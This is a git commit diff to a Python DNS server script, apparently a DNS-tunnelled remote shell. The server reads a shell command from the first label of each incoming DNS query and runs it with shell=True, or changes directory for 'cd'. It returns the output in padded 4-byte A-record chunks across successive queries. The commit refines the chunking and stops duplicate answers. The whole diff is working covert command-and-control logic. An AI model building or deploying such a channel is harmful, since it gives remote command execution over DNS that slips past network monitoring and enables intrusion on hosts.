5fc64fb32b95359081d661c8443185b8fd23db49
server dns <foo@bar.fr>
2019-01-30 10:57:02 +0000

    update salt in function of the answer + don't answer twice at the same request

--- src/serveur.py
+++ src/serveur.py
@@ -27,18 +27,17 @@ while True:
     print(q)
     
     cmd = q.qList[0].qname.split(".")
+    print(cmd)
 
     if(cmd[0] != "devtoplay"):
         if(last != cmd[0] and req_left == 0):
-            last = cmd[0]
             i = 0
             while(cmd[0][i] >= "0" and cmd[0][i] <= "9"):
                 i += 1
-            print(cmd[0],last)
-
+            
             if("cd" in cmd[0][i:]):
                 os.chdir(cmd[0][i+3:])
-                res=b''
+                res=b'\x00\x00\x00\x00'
             else:
                 p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                 res,err = p.communicate()
@@ -50,23 +49,32 @@ while True:
                     res = b''
                 
                 res = len(res).to_bytes(1,'big') + res
-                a = [RR(q.qList[0].qname,res[i:i+4], 1, 1, 1)
-                     for i in range(0,len(res),4)]
-                a.append(RR(q.qList[0].qname,b'\x00\x00\x00\x00', 1, 1, 1))
-                print(a)
+                sel = int(cmd[0][:i],10)
+                a = [RR("",res[j:j+4], 1, 1, 1) for j in range(0,len(res),4)]
                 req_left = len(a)
+                l = len(a[req_left - 1].rdata)
+                
+                if(l != 4):
+                    a[req_left - 1].rdata += b'\x00' * (4 - l)
+                    
+                a.append(RR("",b'\x00\x00\x00\x00', 1, 1, 1))
+                req_left += 1
                 req = 0
 
     if(req  < req_left):
-        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [a[req]])
-        req += 1
-
-        if(req == req_left):
-            req_left = 0
-    else:
-        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [RR(q.qList[0].qname,b'\x01\x01\x01\x01', 1, 1, 1)])
+        if(cmd[0] != last):
+            answer = a[req]
+            a[req].name = q.qList[0].qname
+            req += 1
+            if(req == req_left):
+                req_left = 0
+            
+        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [answer])
         
-    
+    else:
+        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [RR(q.qList[0].qname,res, 1, 1, 1)])
+        
+    last = cmd[0]
 
 
     print(message)
